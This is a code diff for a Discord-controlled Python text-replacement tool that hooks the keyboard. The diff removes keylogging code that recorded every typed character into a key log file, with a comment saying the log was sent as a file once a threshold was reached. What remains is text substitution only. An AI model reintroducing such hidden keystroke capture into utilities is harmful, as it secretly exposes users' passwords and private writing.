@@ -26,12 +26,6 @@ from discord.ext.commands import Context
 
 # Configuration file written by the bot.
 REPLACEMENTS_FILE = Path("replacements.json")
-# File that collects the typed characters.
-KEY_LOG_FILE = Path("key_logs.txt")
-# Number of characters after which the key log is sent as a file.
-KEY_LOG_FILE_THRESHOLD = 2000
-# Number of characters kept in memory before they are written to the log.
-MAX_LOG_LENGTH = 2000
 # Seconds between two checks of the configuration file.
 RELOAD_INTERVAL = 1.0
 
@@ -67,42 +61,12 @@ def write_replacements(path: Path, replacements: dict[str, str]) -> None:
     os.replace(temp_path, path)
 
 
-def read_key_log(path: Path = KEY_LOG_FILE) -> str:
-    """Read the collected characters from the key log."""
-    try:
-        return path.read_text(encoding="utf-8", errors="replace")
-    except OSError:
-        return ""
-
-
-def key_log_exists(path: Path = KEY_LOG_FILE) -> bool:
-    """Whether the key log file exists."""
-    return path.exists()
-
-
-def log_status(
-    status: str, rules: dict[str, str], path: Path = KEY_LOG_FILE
-) -> None:
-    """Append the running status and the active rules to the key log."""
-    entry = (
-        f"\n--- text replacer status: {status} ({len(rules)} rule(s)) ---\n"
-        f"rules: {json.dumps(rules, ensure_ascii=False)}\n"
-    )
-
-    try:
-        with path.open("a", encoding="utf-8") as log:
-            log.write(entry)
-    except OSError as exc:
-        print(f"[-] Could not write the key log: {exc}")
-
-
 class TextReplacer:
     """Swaps typed sequences for their replacement while typing."""
 
     def __init__(
         self,
         config_path: Path = REPLACEMENTS_FILE,
-        log_path: Path = KEY_LOG_FILE,
     ) -> None:
         # Imported here so the Discord bot can use this module without
         # pulling in the keyboard hook.
@@ -126,10 +90,8 @@ class TextReplacer:
         }
 
         self.config_path = config_path
-        self.log_path = log_path
         self.rules: dict[str, str] = self.load_rules()
         self.word_buffer = ""
-        self.typed_log: list[str] = []
         self.busy = False
         self.listener: Any = None
         self.stopped = threading.Event()
@@ -168,35 +130,6 @@ class TextReplacer:
             return self.config_path.stat().st_mtime
         except OSError:
             return None
-
-    # ------------------------------------------------------------------
-    # Key log
-    # ------------------------------------------------------------------
-    def log_characters(self, char: str) -> None:
-        """Collect typed characters and write them out once enough are read."""
-        self.typed_log.append(char)
-
-        if len(self.typed_log) >= MAX_LOG_LENGTH:
-            self.flush_log()
-
-    def flush_log(self) -> None:
-        """Store the collected characters and clear the in-memory buffer."""
-        if not self.typed_log:
-            return
-
-        text = "".join(self.typed_log)
-        self.typed_log = []
-
-        try:
-            with self.log_path.open("a", encoding="utf-8") as log:
-                log.write(text)
-                log.write("\n")
-        except OSError as exc:
-            print(f"[-] Could not write the key log: {exc}")
-
-    def buffered_characters(self) -> str:
-        """Return the characters that are still held in memory."""
-        return "".join(self.typed_log)
 
     # ------------------------------------------------------------------
     # Replacement
@@ -278,9 +211,6 @@ class TextReplacer:
         if not char:
             return
 
-        # Every typed character is collected for the key log.
-        self.log_characters(char)
-
         # A non word character ends the current word.
         if not char.isalnum() and char != "_":
             self.word_buffer = ""
@@ -312,14 +242,12 @@ class TextReplacer:
         threading.Thread(target=self.watch_rules, daemon=True).start()
 
     def stop(self) -> None:
-        """Stop watching the keyboard and store the collected characters."""
+        """Stop watching the keyboard."""
         self.stopped.set()
 
         if self.listener is not None:
             self.listener.stop()
             self.listener = None
-
-        self.flush_log()
 
     @property
     def running(self) -> bool:
@@ -463,16 +391,6 @@ def active_rules() -> dict[str, str]:
     return read_replacements(REPLACEMENTS_FILE)
 
 
-def buffered_characters() -> str:
-    """Return the characters that are still held in memory."""
-    instance = current_replacer()
-
-    if instance is None:
-        return ""
-
-    return instance.buffered_characters()
-
-
 async def start_text_replacer(ctx: Context[commands.Bot]) -> None:
     """Start the text replacer on this machine."""
     global replacer
@@ -513,7 +431,6 @@ def main() -> None:
 
     print("Text replacer is running. Press ESC to exit.")
     print(f"Rules file: {instance.config_path.resolve()}")
-    print(f"Key log: {instance.log_path.resolve()}")
 
     try:
         while instance.running:
